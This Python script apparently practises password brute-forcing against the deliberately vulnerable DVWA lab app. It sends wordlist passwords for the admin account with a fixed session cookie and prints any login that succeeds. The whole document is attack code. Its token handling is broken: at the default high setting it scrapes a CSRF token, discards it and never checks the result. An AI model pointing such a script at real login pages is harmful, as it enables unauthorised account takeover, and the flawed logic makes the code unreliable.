import requests
from bs4 import BeautifulSoup as bs

security = "high"
password_file = "/opt/fasttrack.txt"
with open(password_file, 'r') as f:
    passwords=f.readlines()

url_partial="http://192.168.1.163:8082/vulnerabilities/brute/"
cookies={
        'security' : security,
        'PHPSESSID' : 'hqkarbdj6vi8gn3gvier9m6qf7'
        }

def payload(passwords, crsftoken='#'):
  payload = []

  for password in passwords:
    payload.append("?username=admin&password={}&Login=Login{}".format(password.rstrip(),crsftoken))

  return payload

def grabCRSFToken(r):
    soup = bs(r.content,'html.parser')
    return soup.findAll(attrs={"name" : "user_token"})[0].get('value')

def testPassword(payload,cookies):
    for i in payload:
      url = url_partial + i.strip()
      r = requests.get(url, cookies=cookies)
      
      if security != 'low':
          grabCRSFToken(r)
      else:
      
        if "Welcome" in r.text:
          print(i)
          print(r.url)


testPassword(payload(passwords), cookies)
